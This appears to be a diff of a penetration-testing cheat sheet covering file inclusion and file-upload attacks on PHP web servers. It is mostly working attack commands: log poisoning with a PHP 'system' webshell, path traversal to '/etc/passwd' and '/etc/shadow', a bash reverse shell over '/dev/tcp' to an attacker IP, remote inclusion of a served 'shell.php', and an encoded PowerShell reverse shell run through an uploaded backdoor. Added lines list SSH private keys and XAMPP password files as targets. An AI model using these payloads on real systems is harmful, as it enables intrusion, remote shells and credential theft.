@@ -41,20 +41,21 @@ curl http://<ip>/../../../../../../../../../etc/passwd
 
 # poison a file that execute commands with <?php echo system($_GET['cmd']); ?> for example.
 # perform the path traversal and add the command
-curl http://192.168.123.193/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls
+curl http://<ip>/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls
 
 # encode commands, for example, a reverse shell like: bash -c "bash -i >& /dev/tcp/192.168.123.193/4444 0>&1"
 bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.230%2F4444%200%3E%261%22
 
 # PHP wrapper
-curl http://192.168.123.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php
-curl "http://192.168.123.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
+curl http://<ip>/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php
+curl "http://<ip>/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
 ```
 
 #### Interesting files
 
 **Linux Systems**
 
+- `/home/<user>/.ssh/id_rsa`
 - `/etc/passwd`
 - `/etc/shadow`
 - `/etc/hosts`
@@ -90,6 +91,7 @@ curl "http://192.168.123.16/meteor/index.php?page=data://text/plain,<?php%20echo
 
 **Windows Systems**
 
+- `C:\Users\<user>\.ssh\id_rsa`
 - `C:\Windows\System32\drivers\etc\hosts`
 - `C:\boot.ini`
 - `C:\Windows\win.ini`
@@ -97,6 +99,19 @@ curl "http://192.168.123.16/meteor/index.php?page=data://text/plain,<?php%20echo
 - `C:\inetpub\wwwroot\`
 - `C:\Windows\php.ini`
 - `C:\inetpub\wwwroot\web.config`
+- `C:\xampp\passwords.txt`
+- `C:\xampp\apache\bin\php.ini`
+- `C:\xampp\apache\logs\access.log`
+- `C:\xampp\apache\logs\error.log`
+- `C:\xampp\apache\conf\httpd.conf`
+- `C:\xampp\filezillaftp\filezilla server.xml`
+- `C:\xampp\filezillaftp\logs`
+- `C:\xampp\filezillaftp\logs\access.log`
+- `C:\xampp\filezillaftp\logs\error.log`
+- `C:\xampp\mysql\data\mysql.err`
+- `C:\xampp\phpmyadmin\config.inc`
+- `C:\xampp\phpmyadmin\config.inc.php`
+- `C:\xampp\phpmyadmin\phpinfo.php`
 
 **General Application Files (Platform Independent):**
 
@@ -108,19 +123,19 @@ curl "http://192.168.123.16/meteor/index.php?page=data://text/plain,<?php%20echo
 ### Remote
 
 ```shell
-# obtain a PHP shell from /usr/share/webshells/php in Kali or from the internet and serve it via http server such as python or apache.
+# serve a PHP reverse shell and set a listener and execute it remotely
 python3 -m http.server 80
-curl http://192.168.123.16/meteor/index.php?page=http://192.168.45.230/simple-backdoor.php&cmd=ls
+curl http://<url>/index.php?page=http://<local_ip>/shell.php
 ```
 
 ## File Upload
 
-- Rename files to bypass uploader logic such as `.phps, .php7, pHP`
-- If the validation is on the front, the request can be altered with Burp changing the extension.
+- Rename files to bypass uploader logic such as `.phps, .php7, .pHP, .png.php, .php%20`
+- If the validation is on the front, the request can be altered with Caido/Burp changing the extension.
 
 ```shell
 # after uploading the file
-curl http://192.168.169.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
+curl http://<ip>/uploads/shell.pHP?cmd=dir
 
 # encode a PowerShell reverse shell one-liner to execute with the backdoor
 pwsh
@@ -130,7 +145,7 @@ $EncodedText =[Convert]::ToBase64String($Bytes)
 $EncodedText
 
 # use the encoded one-liner
-curl http://192.168.169.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-encodedCommand%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwA...AGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+curl http://<ip>/uploads/simple-backdoor.pHP?cmd=powershell%20-encodedCommand%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwA...AGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
 ```
 
 - Capture NTLM hash
